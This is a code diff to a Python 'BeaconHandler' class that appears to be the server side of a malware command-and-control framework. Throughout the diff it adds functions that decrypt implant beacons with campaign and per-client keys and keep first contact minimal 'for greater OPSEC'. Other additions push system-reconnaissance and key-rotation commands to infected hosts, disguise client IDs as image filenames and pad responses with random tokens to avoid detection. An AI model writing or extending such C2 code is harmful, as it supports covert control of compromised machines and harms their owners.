@@ -83,7 +83,7 @@ class BeaconHandler(BaseHandler):
                 self.send_error_response(400, "Missing data parameter")
                 return
             
-            # Process the request payload directly since _process_beacon_data is removed
+            # Process the request payload
             try:
                 # Try to decrypt the data if possible
                 decrypted_data = None
@@ -175,7 +175,7 @@ class BeaconHandler(BaseHandler):
                     self.send_error_response(400, "Missing data field")
                     return
                 
-                # Process the beacon data - same for both GET and POST
+                # Process the beacon data
                 self._process_beacon_data(encrypted_data, token, include_rotation_info, body_data, client_id=client_id, is_first_contact=is_first_contact)
                 
             except json.JSONDecodeError:
@@ -185,6 +185,76 @@ class BeaconHandler(BaseHandler):
         except Exception as e:
             logger.error(f"Error handling POST beacon: {str(e)}")
             self.send_error_response(500, "Internal server error")
+    
+    def _process_beacon_data(self, encrypted_data, token, include_rotation_info, body_data, client_id=None, is_first_contact=False):
+        """
+        Process raw beacon data
+        
+        Args:
+            encrypted_data: Encrypted data from the client
+            token: Token padding (unused)
+            include_rotation_info: Whether to include rotation info in response
+            body_data: Full request body data
+            client_id: Client ID if available
+            is_first_contact: Whether this is the first contact from client
+        """
+        # Try to decrypt the data if possible
+        decrypted_data = None
+        if client_id:
+            try:
+                decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
+                self.log_message(f"Successfully decrypted with client key for {client_id}")
+            except Exception as e:
+                self.log_message(f"Failed to decrypt with client ID: {e}")
+        
+        if not decrypted_data:
+            # Try with campaign key if client key doesn't work
+            try:
+                decrypted_data = self.crypto_helper.decrypt(encrypted_data)
+                self.log_message(f"Successfully decrypted with campaign key")
+            except Exception as e:
+                # For first contact, data might not be encrypted
+                if is_first_contact:
+                    decrypted_data = encrypted_data
+                    self.log_message(f"Using raw data for first contact")
+                else:
+                    self.log_message(f"Failed to decrypt data: {e}")
+                    self.send_error_response(400, "Decryption failed")
+                    return
+        
+        # Try to parse decrypted data
+        try:
+            if isinstance(decrypted_data, str):
+                # Try to parse as JSON
+                try:
+                    payload = json.loads(decrypted_data)
+                except json.JSONDecodeError:
+                    # Not JSON, use as-is
+                    payload = decrypted_data
+            else:
+                payload = decrypted_data
+                
+            # Extracting system_info from payload
+            system_info = None
+            if isinstance(payload, dict) and 'op_type' in payload and payload['op_type'] == 'beacon':
+                # Modern structure
+                system_info = payload.get('payload', {})
+                # If payload is a string, parse it
+                if isinstance(system_info, str):
+                    try:
+                        system_info = json.loads(system_info)
+                    except:
+                        pass
+            else:
+                # Old structure or direct system info
+                system_info = payload
+                
+            # Process beacon with system info
+            self._process_beacon_with_system_info(client_id, system_info, include_rotation_info)
+                
+        except Exception as e:
+            self.log_message(f"Error processing beacon data: {e}")
+            self.send_error_response(500, "Error processing beacon")
     
     def _process_beacon_with_system_info(self, client_id, system_info, include_rotation_info=False):
         """
@@ -202,6 +272,22 @@ class BeaconHandler(BaseHandler):
             except json.JSONDecodeError:
                 # If we can't decode it, create a minimal dict
                 system_info = {"raw_data": system_info}
+        
+        # For first contact or unidentified client, use minimal info (mainly IP address)
+        is_new_client = client_id not in self.client_manager.get_clients_info()
+        
+        # Only include IP in initial contact for greater OPSEC
+        if is_new_client or not client_id:
+            # Strip to minimal first contact info - just enough to identify the client
+            minimal_info = {
+                "IP": self.client_address[0]
+            }
+            
+            # Check if we have a basic identifier like machine GUID but no other system info
+            if isinstance(system_info, dict) and "MachineGuid" in system_info:
+                minimal_info["MachineGuid"] = system_info["MachineGuid"]
+                
+            system_info = minimal_info
         
         # Identify client using system info
         if not client_id:
@@ -232,12 +318,39 @@ class BeaconHandler(BaseHandler):
         # Verify client identity
         is_verified, confidence, needs_key_rotation, warnings = self.client_helper.verify_client(client_id, system_info)
         
+        # Determine system info completeness - check if we have full system details or just IP
+        has_full_system_info = False
+        if isinstance(system_info, dict) and len(system_info) > 2:
+            # Check for critical fields that would only be in full system info
+            required_fields = ['Hostname', 'Username', 'OsVersion']
+            has_full_system_info = any(field in system_info for field in required_fields)
+        
         # Get commands for the client
         commands, has_key_operation = self.client_helper.organize_commands(
             client_id, 
             include_key_rotation=needs_key_rotation,
             first_contact=is_new_client
         )
+        
+        # For clients that have had key rotation but haven't submitted full system info,
+        # prioritize system info request before other commands
+        if not is_new_client and not has_full_system_info and not has_key_operation:
+            # Prepend a command to request full system info
+            system_info_command = {
+                "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "command_type": "system_info_request",
+                "args": "Get-SystemIdentification"
+            }
+            commands.insert(0, system_info_command)
+            self.log_message(f"Requesting full system info from client {client_id}")
+        
+        # For clients with full system info but no unique key, request a key rotation
+        if not is_new_client and has_full_system_info and needs_key_rotation and not has_key_operation:
+            # Request key rotation now that we have full system info
+            key_rotation_command = self.client_helper.prepare_key_rotation(client_id)
+            commands.insert(0, key_rotation_command)
+            has_key_operation = True
+            self.log_message(f"Requesting key rotation after receiving full system info from {client_id}")
         
         # Add path rotation information if requested
         if include_rotation_info:
@@ -288,5 +401,14 @@ class BeaconHandler(BaseHandler):
         # Send the response as JSON
         self.send_response(200, "application/json", json.dumps(response_data))
     
-    # The rest of the BeaconHandler methods remain largely the same,
-    # just updating references from dedicated paths to use random paths
+    def _generate_client_id(self):
+        """Generate a unique client ID"""
+        # Avoid obvious naming patterns - make it look like a filename with common extension
+        hash_string = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+        return f"{hash_string}-img.jpeg"
+        
+    def _generate_token_padding(self):
+        """Generate random token padding for responses"""
+        padding_length = random.randint(50, 500)
+        chars = string.ascii_letters + string.digits
+        return ''.join(random.choice(chars) for _ in range(padding_length))
